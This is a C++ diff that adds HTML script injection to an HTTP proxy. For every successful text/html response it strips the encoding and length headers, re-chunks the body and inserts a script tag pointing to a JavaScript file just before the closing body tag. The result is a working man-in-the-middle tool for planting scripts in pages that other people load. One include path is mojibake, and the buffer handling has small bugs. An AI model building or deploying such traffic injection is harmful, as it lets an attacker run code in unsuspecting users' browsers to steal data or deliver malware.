@@ -403,12 +403,22 @@ DWORD WINAPI TestThread( PVOID pParam )
 }
 
 
- #include "HttpSendParser.h"
+#include "HttpSendParser.h"
+#include ".\HttpÊý¾Ý½âÎö\HttpDataParser.h"
+
+typedef struct tagCALLBACK_PARAM
+{
+	BOOL bReplaceData;
+	HANDLE hRemote;
+}CALLBACK_PARAM,*PCALLBACK_PARAM;
 
  typedef struct tagCLIENT_DATA
  {
  	CStringA strHeadBuffer;
  	HANDLE   hRemote;
+	CHttpDataParser *pHttpDataParser;
+	CALLBACK_PARAM CallbackParam;
+	BOOL bServerToClient;
  }CLIENT_DATA,*PCLIENT_DATA;
 
 HANDLE hIOCPServer = NULL;
@@ -453,11 +463,91 @@ BOOL EasyConnect( SOCKET sock , LPCSTR pszTargetIP,USHORT nTargetPort)
 	return bRes == 0;
 }
 
+
+
+CStringA g_strJsUrl="./fuckyou.js";
+
+VOID CALLBACK DataRecvedCallback( PVOID pParam , BYTE *pData,int nDataLen,BOOL bHeadData,BOOL bFinalData)
+{
+	PCALLBACK_PARAM pCallbackParam = (PCALLBACK_PARAM)pParam;
+
+	if ( NULL == pData || nDataLen == 0 )
+	{
+		return ;
+	}
+
+	if (bHeadData)
+	{
+		pCallbackParam->bReplaceData = FALSE;
+
+		CHttpRecvParser recvParser;
+		if(recvParser.ParseData((const char *)pData,nDataLen))
+		{
+			if (recvParser.GetResponseCode() == "200")
+			{
+				CStringA strContentType;
+				strContentType = recvParser.GetValueByName("Content-Type");
+				if (strContentType.Find("text/html") >= 0 )
+				{
+					recvParser.DelResponseNode("Content-Encoding");
+					recvParser.DelResponseNode("Content-Length");
+					recvParser.DelResponseNode("Transfer-Encoding");
+					recvParser.AddResponseNode("Transfer-Encoding","chunked");
+
+					pCallbackParam->bReplaceData = TRUE;
+
+					CStringA strNewBuffer;
+					recvParser.BuildBuffer(strNewBuffer);
+					
+					PostSendRequest(pCallbackParam->hRemote,(BYTE *)strNewBuffer.GetBuffer(),strNewBuffer.GetLength(),NULL);
+				}
+			}
+
+		}
+	}
+	else
+	{
+		if (pCallbackParam->bReplaceData)
+		{
+			CStringA strTempData;
+
+			char *pchTemp = new char[nDataLen+1];
+			memcpy_s(pchTemp,nDataLen,(char *)pData,nDataLen);
+			pchTemp[nDataLen] = 0;
+
+			strTempData = pchTemp;
+
+			delete pchTemp;
+
+			CStringA strReplaceData;
+			strReplaceData.Format("<script src=\"%s\"></script></body>",g_strJsUrl);
+			strTempData.Replace("</body>",strReplaceData);
+
+			CStringA strChunkData;
+			strChunkData.Format("%x\r\n%s\r\n",strTempData.GetLength(),strTempData.GetBuffer());
+			PostSendRequest(pCallbackParam->hRemote,(BYTE *)strChunkData.GetBuffer(),strChunkData.GetLength(),NULL);
+			if (bFinalData)
+			{
+				CStringA strChunkData;
+				strChunkData = "0\r\n\r\n";
+				PostSendRequest(pCallbackParam->hRemote,(BYTE *)strChunkData.GetBuffer(),strChunkData.GetLength(),NULL);
+			}
+
+		}
+	}
+
+
+}
+
 VOID WINAPI MY_CALLBACK_CLIENT_CONNECT( HANDLE hClient,sockaddr_in *psiClient )
 {
 	PCLIENT_DATA pClientData = new CLIENT_DATA;
 	pClientData->hRemote = NULL;
 	pClientData->strHeadBuffer = "";
+	pClientData->CallbackParam.bReplaceData = FALSE;
+	pClientData->CallbackParam.hRemote = NULL;
+	pClientData->pHttpDataParser = NULL;
+	pClientData->bServerToClient = FALSE;
 	SetUserParam(hClient,pClientData);
 }
 VOID WINAPI MY_CALLBACK_CLIENT_DISCONNECT( HANDLE hClient , PVOID pUserParam)
@@ -475,7 +565,18 @@ VOID WINAPI MY_CALLBACK_DATA_RECV( HANDLE hClient,PVOID pUserParam,BYTE *pDataBu
 	PCLIENT_DATA pClientData = (PCLIENT_DATA)pUserParam;
 	if (pClientData && pClientData->hRemote)
 	{
-		PostSendRequest(pClientData->hRemote,pDataBuffer,dwDataLen,NULL);
+		
+		if ( pClientData->bServerToClient )
+		{
+			BOOL bFinalData = FALSE;
+			pClientData->pHttpDataParser->ParseRecvData( pDataBuffer,dwDataLen,&bFinalData);
+		}
+		
+		if (  FALSE == pClientData->CallbackParam.bReplaceData )
+		{
+			PostSendRequest(pClientData->hRemote,pDataBuffer,dwDataLen,NULL);
+		}
+		
 		return ;
 	}
 	
@@ -515,10 +616,17 @@ VOID WINAPI MY_CALLBACK_DATA_RECV( HANDLE hClient,PVOID pUserParam,BYTE *pDataBu
 				PostRecvRequest( hRemote );
 
 				pClientData->hRemote = hRemote;
+				
 
 				PCLIENT_DATA pRemoteData = new CLIENT_DATA;
 				pRemoteData->hRemote = hClient;
 				pRemoteData->strHeadBuffer = "";
+				pRemoteData->CallbackParam.bReplaceData = FALSE;
+				pRemoteData->CallbackParam.hRemote = hClient;
+				pRemoteData->pHttpDataParser = new CHttpDataParser(DataRecvedCallback,&(pRemoteData->CallbackParam));
+				pRemoteData->bServerToClient = TRUE;
+
+				pClientData->CallbackParam.hRemote = hRemote;
 
 				SetUserParam( hRemote , (PVOID)pRemoteData );
 
